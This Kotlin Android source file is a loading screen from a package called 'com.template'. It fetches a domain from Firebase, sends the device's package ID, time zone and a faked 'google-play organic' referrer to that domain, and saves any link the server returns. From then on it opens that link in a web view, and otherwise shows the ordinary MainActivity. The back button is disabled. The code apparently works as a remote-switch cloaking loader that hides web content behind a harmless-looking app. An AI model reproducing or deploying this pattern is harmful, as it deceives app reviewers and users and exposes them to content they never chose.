package com.template

import ConnectionDetector
import android.R.attr.password
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.android.volley.Request
import com.android.volley.Response
import com.android.volley.toolbox.StringRequest
import com.android.volley.toolbox.Volley
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.tasks.await
import org.json.JSONException
import org.json.JSONObject
import java.util.*


class LoadingActivity : AppCompatActivity() {
    val APP_PREFERENCES = "FIRST_OPEN"
    val save_link = "link"
    val rediscovery = "rediscovery"
    lateinit var pref: SharedPreferences

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_loading)
        pref = getSharedPreferences(APP_PREFERENCES, Context.MODE_PRIVATE)
        val rediscoveryBool = pref.getBoolean(rediscovery, false)
        var link = pref.getString(save_link, "")

        val connectionDetector =
            ConnectionDetector(applicationContext).ConnectingToInternet()//check the Internet connection
        if (!connectionDetector && !rediscoveryBool) {
            Log.d("debugApp", "no internet connection")
            val intent = Intent(this@LoadingActivity, MainActivity::class.java)
            startActivity(intent)
        }


        if (rediscoveryBool) {
            actionWithLink(link)
        } else {
            lifecycleScope.launch(Dispatchers.IO) {
                if (connectionDetector) {
                    Log.d("debugApp", "internet connection correct")
                    if (!rediscoveryBool) {
                        Log.d("debugApp", "first open")
                        pref.edit().putBoolean(rediscovery, true).apply()
                        val domenFromFirebase = getLinkFromDb()
                        if (domenFromFirebase != "") {
                            getRequestToURL(makeURl(domenFromFirebase))
                        }
                    }
                } else actionWithLink(link)
            }
        }


    }


    fun makeURl(domenFromFirebase: String): String {
        Log.d("debugApp", "make url")
        val packageName = BuildConfig.APPLICATION_ID
        val timeZone: String = TimeZone.getDefault().id
        val uuid = UUID.randomUUID().toString()
        var url: String =
            "${domenFromFirebase}/?packageid=${packageName}&usserid=${uuid}&getz=${timeZone}&getr=utm_source=google-play&utm_medium=organic"
        Log.d("debugApp", url)
        return url
    }

    private suspend fun getLinkFromDb(): String {
        Log.d("debugApp", "getLinkFromDb")
        val db = Firebase.firestore
        var dblink: String = ""
        try {
            db.collection("database")
                .get()
                .addOnSuccessListener { result ->
                    for (document in result) {
                        dblink = document.data.getValue("link").toString()
                        Log.d("debugApp", dblink)
                    }
                }
                .addOnFailureListener {
                    dblink = ""
                }.await()
        } catch (e: Exception) {
            dblink = ""
        }
        return dblink
    }


    private fun actionWithLink(link: String?) {
        Log.d("debugApp", "actionWithLink")
        if (link != "") {
            Log.d("debugApp", "correct link")
            intent = Intent(this@LoadingActivity, WebActivity::class.java)
            intent.putExtra("urlStr", link)
            startActivity(intent)
        } else {
            Log.d("debugApp", "incorrect link")
            Intent(this@LoadingActivity, MainActivity::class.java).also {
                startActivity(it)
            }
        }
    }

    override fun onBackPressed() {
        // do nothing
    }

    private fun getRequestToURL(urlStr: String) {
        Log.d("debugApp", "getRequestToURL")
        val queue = Volley.newRequestQueue(this)
        val request: StringRequest = object : StringRequest(
            Method.GET, urlStr,
            Response.Listener { response ->
                if (response != null && response.toString() != "") {
                    Log.d("debugApp", "response link:${response}")
                    actionWithLink(response.toString())
                }
                pref.edit().putString(save_link, response.toString()).apply()

            },
            Response.ErrorListener { error ->
                actionWithLink("")
                pref.edit().putString(save_link, "error").apply()
//                Log.d("debugApp", "error response link:${error}")
                error.printStackTrace()
            }
        ) {
            override fun getHeaders(): Map<String, String> {
                val headers: MutableMap<String, String> = HashMap()
                headers["Accept-Language"] = Locale.getDefault().country
                return headers
            }
        }
        queue.add(request)
    }
}